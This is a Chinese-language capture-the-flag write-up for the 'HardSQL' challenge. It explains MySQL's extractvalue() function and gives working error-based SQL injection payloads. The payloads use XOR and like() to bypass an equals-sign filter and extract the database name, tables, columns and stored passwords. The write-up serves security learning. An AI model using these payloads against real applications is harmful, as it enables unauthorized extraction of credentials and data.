# [极客大挑战 2019]HardSQL

## 知识点

`sql注入`

`报错注入`

## 解题

`extractvalue`

**extractvalue()**
extractvalue() :对XML文档进行查询的函数

语法：`extractvalue(目标xml文档，xml路径)`

第一个参数 :  第一个参数可以传入目标`xml文档`

第二个参数： `xml`中的位置是可操作的地方，`xml`文档中查找字符位置是用 `/xxx/xxx/xxx/…`这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。

正常查询 第二个参数的位置格式 为`/xxx/xx/xx/xx` ,即使查询不到也不会报错

tip: 还有要注意的地方是，它能够查询的字符串长度最大是32个字符，如果超过32位，我们就需要用函数来查询，比如`right()`,`left()`，`substr()`来截取字符串

再举个栗子：

`SELECT ExtractValue('<a><b><b/></a>', '/a/b');` 这个语句就是寻找前一段`xml文档`内容中的`a`节点下的`b`节点，这里如果`Xpath`格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。

利用`concat`函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。

知道这些知识之后，我们开始注入吧

用`^`来连接函数，形成异或
这边用的是`extractvalue()`

```
爆数据库
?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(database())),0x7e))%23
然后，我们再payload爆表名，但是这里把等于号给我们过滤了，不过我们还有骚操作like用法
?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),0x7e))%23
爆字段
?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e))%23
查数据
?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e))%23
字符串较长 使用left() right() substr()
?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e))%23
?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(left(password,30)))from(H4rDsq1)),0x7e))%23

or注入也可以
1'or(extractvalue(1,concat(0x7e,(select(database())),0x7e)))#
```

[参考](https://www.cnblogs.com/junlebao/p/13836583.html)